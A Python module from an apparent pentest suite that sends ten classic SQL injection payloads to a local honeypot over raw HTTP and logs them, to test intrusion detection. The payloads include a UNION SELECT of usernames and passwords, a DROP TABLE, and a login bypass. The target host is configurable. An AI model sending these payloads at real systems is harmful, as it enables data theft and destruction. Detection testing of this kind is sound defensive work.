#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🗄️ sim_sql_inject — Simulation SQL Injection vers honeypot local
GPLv3 — Victor Pozen — Kerberos Pentest Suite v1.0
"""
import time
import socket
from pathlib import Path
from datetime import datetime

MODULE_NAME  = "sim_sql_inject"
MODULE_LABEL = "SQL Injection"
_running     = False
_OUT_DIR     = Path(__file__).parent.parent / "payloads_fake" / "sql"

# Payloads SQL injection classiques + IA-générés
_SQL_PAYLOADS = [
    ("union_select",    "' UNION SELECT username,password FROM users--"),
    ("blind_boolean",   "' AND 1=1--"),
    ("blind_time",      "'; WAITFOR DELAY '0:0:5'--"),
    ("stacked",         "'; DROP TABLE users; SELECT * FROM info--"),
    ("error_based",     "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--"),
    ("dump_all",        "' OR '1'='1"),
    ("bypass_login",    "admin'--"),
    ("comment",         "' OR 1=1 #"),
    ("ai_generated",    "' UNION SELECT NULL,NULL,NULL,NULL,table_name FROM information_schema.tables--"),
    ("nosql_inject",    '{"$gt": ""}'),
]


def _send_sql_probe(host: str, port: int, payload: str) -> bool:
    """Envoie une requête HTTP avec payload SQL — vers localhost uniquement"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        sock.connect((host, port))
        # Requête HTTP GET avec payload SQL dans l'URL
        req = (f"GET /search?q={payload} HTTP/1.1\r\n"
               f"Host: {host}\r\n"
               f"User-Agent: KerberosPentestSuite/1.0\r\n"
               f"Connection: close\r\n\r\n")
        sock.send(req.encode(errors="replace"))
        sock.close()
        return True
    except Exception:
        return False


def run(target: str = "127.0.0.1", callback=None) -> dict:
    global _running
    _running = True
    _OUT_DIR.mkdir(parents=True, exist_ok=True)

    results = {"module": MODULE_NAME, "target": target,
               "started": datetime.now().isoformat(),
               "events": [], "files": [], "sent": 0, "status": "running"}

    def log(msg):
        results["events"].append(msg)
        if callback: callback(msg)

    log("🗄️ Démarrage simulation SQL Injection...")
    log(f"   Cible : {target}:80 (honeypot local)")
    log(f"   {len(_SQL_PAYLOADS)} payloads SQL à envoyer")

    # ── Envoi des payloads vers le honeypot ───────────────────────────────
    for ptype, payload in _SQL_PAYLOADS:
        if not _running:
            break
        time.sleep(0.2)
        sent = _send_sql_probe(target, 80, payload)
        status = "✅ envoyé" if sent else "⚠️ port fermé"
        results["sent"] += 1
        log(f"  [{ptype}] {status} → {payload[:50]}")

    # ── Fichier log d'attaque SQL ─────────────────────────────────────────
    time.sleep(0.2)
    f1 = _OUT_DIR / "fake_sqli_attempts.log"
    lines = [f"[KERBEROS_PENTEST_TEST] SQL Injection simulation",
             f"Target: {target}", f"Timestamp: {datetime.now().isoformat()}", ""]
    for ptype, payload in _SQL_PAYLOADS:
        lines.append(f"[{ptype}] {payload}")
    f1.write_text("\n".join(lines), encoding="utf-8")
    results["files"].append(str(f1))
    log(f"✅ Log créé : {f1.name}")

    # ── Script d'attaque SQL signé ────────────────────────────────────────
    time.sleep(0.2)
    f2 = _OUT_DIR / "fake_sqli_scanner.py"
    f2.write_text(
        "#!/usr/bin/env python3\n"
        "# KERBEROS PENTEST TEST — Scanner SQL Injection (inoffensif)\n\n"
        "PAYLOADS = [\n" +
        "".join(f'    "{p}",\n' for _, p in _SQL_PAYLOADS) +
        "]\n\n"
        "# Jamais exécuté automatiquement\n"
        "if __name__ == '__NEVER__':\n"
        "    for p in PAYLOADS:\n"
        "        print(p)\n",
        encoding="utf-8")
    results["files"].append(str(f2))
    log(f"✅ Script créé : {f2.name}")

    log(f"📊 {results['sent']} requêtes SQL envoyées — honeypot doit logger")
    log("   → db/pentest.db table honeypot_connections doit enregistrer")
    log("⏳ En attente détection...")

    results["status"] = "completed"
    results["finished"] = datetime.now().isoformat()
    _running = False
    return results


def stop():
    global _running
    _running = False


def get_info() -> dict:
    return {"name": MODULE_NAME, "label": MODULE_LABEL,
            "description": "Payloads SQL injection vers honeypot local",
            "version": "1.0", "targets": ["honeypot", "guard_netshield"]}
